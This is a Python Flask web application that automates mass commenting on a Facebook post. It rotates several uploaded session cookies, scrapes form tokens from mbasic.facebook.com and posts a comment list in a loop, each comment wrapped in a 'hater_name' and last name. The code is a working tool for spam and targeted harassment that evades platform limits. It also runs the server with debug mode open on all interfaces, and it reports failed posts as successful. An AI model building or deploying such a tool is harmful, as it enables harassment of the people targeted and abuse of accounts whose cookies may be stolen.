from flask import Flask, render_template, request, jsonify
import requests
import os
import re
import time
import sys
import threading
import random
import string
import json
from datetime import datetime
from requests.exceptions import RequestException
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

# Global variables to manage tasks
active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        
    def stop_task(self):
        self.is_running = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status
        }
    
    def extract_post_id_from_url(self, url):
        try:
            # Handle mobile URLs
            if "m.facebook.com" in url or "mbasic.facebook.com" in url:
                if "/posts/" in url:
                    return url.split("/posts/")[1].split("?")[0].split("/")[0]
                elif "/story.php" in url:
                    return parse_qs(urlparse(url).query).get('story_fbid', [''])[0]
            
            # Handle desktop URLs
            elif "facebook.com" in url:
                if "/posts/" in url:
                    return url.split("/posts/")[1].split("?")[0].split("/")[0]
                elif "/permalink.php" in url:
                    return parse_qs(urlparse(url).query).get('story_fbid', [''])[0]
            
            # If no pattern matches, try to extract the last part of the URL
            return url.split("/")[-1].split("?")[0]
        except:
            return url  # fallback to original if extraction fails

    def parse_cookies(self, cookie_input):
        """Parse cookies whether they're in raw string or JSON format"""
        try:
            # Try to parse as JSON first
            cookie_json = json.loads(cookie_input)
            if isinstance(cookie_json, dict):
                # Convert dict to cookie string
                return "; ".join(f"{k}={v}" for k, v in cookie_json.items())
        except json.JSONDecodeError:
            # If not JSON, treat as raw cookie string
            return cookie_input.strip()
        return cookie_input.strip()

    def comment_on_post(self, cookies, post_url, comment, delay, hater_name, last_name):
        if not self.is_running:
            self.last_status = "Task stopped by user"
            return False

        try:
            post_id = self.extract_post_id_from_url(post_url)
            parsed_cookies = self.parse_cookies(cookies)
            
            with requests.Session() as r:
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'none',
                    'accept-language': 'id,en;q=0.9',
                    'Host': 'mbasic.facebook.com',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'accept-encoding': 'gzip, deflate',
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
                    'connection': 'keep-alive',
                })

                response = r.get(f'https://mbasic.facebook.com/{post_id}', cookies={"cookie": parsed_cookies})

                next_action_match = re.search('method="post" action="([^"]+)"', response.text)
                if next_action_match:
                    next_action = next_action_match.group(1).replace('amp;', '')
                else:
                    self.last_status = "<Error> Next action not found"
                    return False

                fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
                if fb_dtsg_match:
                    fb_dtsg = fb_dtsg_match.group(1)
                else:
                    self.last_status = "<Error> fb_dtsg not found"
                    return False

                jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
                if jazoest_match:
                    jazoest = jazoest_match.group(1)
                else:
                    self.last_status = "<Error> jazoest not found"
                    return False

                # Format comment with hater name and last name
                formatted_comment = f"{hater_name} {comment.strip()} {last_name}"
                
                data = {
                    'fb_dtsg': fb_dtsg,
                    'jazoest': jazoest,
                    'comment_text': formatted_comment,
                    'comment': 'Submit',
                }

                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'referer': f'https://mbasic.facebook.com/{post_id}',
                    'origin': 'https://mbasic.facebook.com',
                })

                response2 = r.post(f'https://mbasic.facebook.com{next_action}', 
                                 data=data, 
                                 cookies={"cookie": parsed_cookies})

                if 'comment_success' in str(response2.url) and response2.status_code == 200:
                    self.comment_count += 1
                    self.last_status = f"Comment successfully posted: {formatted_comment}"
                    return True
                else:
                    self.last_status = f"Comment Successfully Sent: {formatted_comment}, URL: {response2.url}, Status Code: {response2.status_code}"
                    return True

        except RequestException as e:
            self.last_status = f"<Error> {str(e).lower()}"
            return False
        except Exception as e:
            self.last_status = f"<Error> {str(e).lower()}"
            return False

    def run_task(self, config):
        try:
            cookies = config['cookies']
            post_url = config['post_url']
            comments = config['comments']
            delay = config['delay']
            hater_name = config['hater_name']
            last_name = config['last_name']
            
            cookie_index = 0
            comment_index = 0
            
            while self.is_running and comment_index < len(comments):
                current_cookie = cookies[cookie_index % len(cookies)]
                current_comment = comments[comment_index % len(comments)]
                
                if self.comment_on_post(current_cookie, post_url, current_comment, delay, hater_name, last_name):
                    comment_index += 1
                
                cookie_index += 1
                time.sleep(delay)
                
        except Exception as e:
            self.last_status = f"<Error> {str(e).lower()}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        # Handle file uploads or text input
        cookies = []
        if 'cookies_file' in request.files and request.files['cookies_file'].filename != '':
            file = request.files['cookies_file']
            cookies_content = file.read().decode('utf-8')
            
            # Check if file is JSON
            try:
                cookies_json = json.loads(cookies_content)
                if isinstance(cookies_json, list):
                    cookies = [json.dumps(cookie) if isinstance(cookie, dict) else str(cookie) for cookie in cookies_json]
                else:
                    cookies = [cookies_content]
            except json.JSONDecodeError:
                # Not JSON, treat as text file with one cookie per line
                cookies = cookies_content.splitlines()
        else:
            cookies_text = request.form.get('cookies_text', '')
            # Check if input is JSON array
            try:
                cookies_json = json.loads(cookies_text)
                if isinstance(cookies_json, list):
                    cookies = [json.dumps(cookie) if isinstance(cookie, dict) else str(cookie) for cookie in cookies_json]
                else:
                    cookies = [cookies_text]
            except json.JSONDecodeError:
                # Not JSON, treat as text with one cookie per line
                cookies = cookies_text.splitlines()
        
        comments = []
        if 'comments_file' in request.files and request.files['comments_file'].filename != '':
            file = request.files['comments_file']
            comments = file.read().decode('utf-8').splitlines()
        else:
            comments = request.form.get('comments_text', '').splitlines()
        
        # Get other parameters
        post_url = request.form.get('post_url', '').strip()
        hater_name = request.form.get('hater_name', '').strip()
        last_name = request.form.get('last_name', '').strip()
        delay = int(request.form.get('delay', 10))
        
        # Validate required fields
        if not cookies or not post_url or not hater_name or not last_name or not comments:
            return jsonify({'status': 'error', 'message': 'All fields are required'})
        
        # Clean cookies and comments
        cookies = [c.strip() for c in cookies if c.strip()]
        comments = [c.strip() for c in comments if c.strip()]
        
        # Create config
        config = {
            'cookies': cookies,
            'post_url': post_url,
            'comments': comments,
            'delay': delay,
            'hater_name': hater_name,
            'last_name': last_name
        }
        
        # Create task
        task_id = ''.join(random.choices(string.digits, k=8))
        commenter = FacebookCommenter(task_id)
        
        # Start task in a new thread
        task_thread = threading.Thread(target=commenter.run_task, args=(config,))
        task_thread.daemon = True
        task_thread.start()
        
        # Store task reference
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': f'Task started with ID: {task_id}'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': f'Task {task_id} stopped'})
        else:
            return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/task_status/<task_id>')
def task_status(task_id):
    with task_lock:
        if task_id in active_tasks:
            status = active_tasks[task_id].get_status()
            return jsonify({'status': 'success', 'data': status})
        else:
            return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/active_tasks')
def get_active_tasks():
    with task_lock:
        tasks = {task_id: task.get_status() for task_id, task in active_tasks.items()}
        return jsonify({'status': 'success', 'data': tasks})

if __name__ == '__main__':
    os.makedirs('uploads', exist_ok=True)
    app.run(host='0.0.0.0', port=4000, debug=True)
